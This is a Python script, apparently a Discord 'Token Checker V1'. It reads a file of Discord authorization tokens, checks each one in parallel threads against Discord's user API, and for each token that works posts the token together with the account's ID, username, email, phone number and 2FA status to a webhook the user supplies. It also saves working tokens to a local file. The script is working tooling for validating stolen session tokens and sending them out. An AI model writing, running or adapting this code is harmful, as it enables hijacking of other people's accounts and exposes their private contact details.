import requests
import os
from colorama import Fore, init
import threading

webhook_one = input("Please enter your webhook >> ")
os.system("cls" if os.name == "nt" else "clear")
init(autoreset=True)

green, red, blue = Fore.GREEN, Fore.RED, Fore.CYAN
invalid_tokens, valid_tokens = set(), set()

def check_token(token):
    sanitized_token = token.encode('ascii', 'ignore').decode('ascii')
    if sanitized_token not in valid_tokens and sanitized_token not in invalid_tokens:
        response = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization": sanitized_token})
        try:
            info = response.json()
            if "id" in info:
                message = f"Token: || {sanitized_token} ||\n* ID: {info['id']}\n* DisplayName: {info.get('global_name')}\n* Username: {info['username']}\n* Email: {info.get('email')}\n* Phone: {info.get('phone')}\n* 2FA: {info['mfa_enabled']}\n* Verified: {info['verified']}"
                valid_tokens.add(sanitized_token)
                print(f"{green}[+] - {blue + sanitized_token.split('.')[0]}... | {green + message}")
                requests.post(webhook_one, json={"content": message, "username": "Token Checker V1", "avatar_url": "https://cdn.discordapp.com/attachments/...jpg"})
                with open("./data/valid.txt", "a", encoding='utf-8') as f:
                    f.write(f"{sanitized_token}\n")
        except Exception as e:
            invalid_tokens.add(sanitized_token)
            print(f"{red}[-] - {blue + sanitized_token.split('.')[0]}... | {red}{e}")

if __name__ == "__main__":
    with open("./data/tokens.txt", "r", encoding='utf-8') as f:
        tokens = f.read().splitlines()
    threads = [threading.Thread(target=check_token, args=(token,)) for token in tokens]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()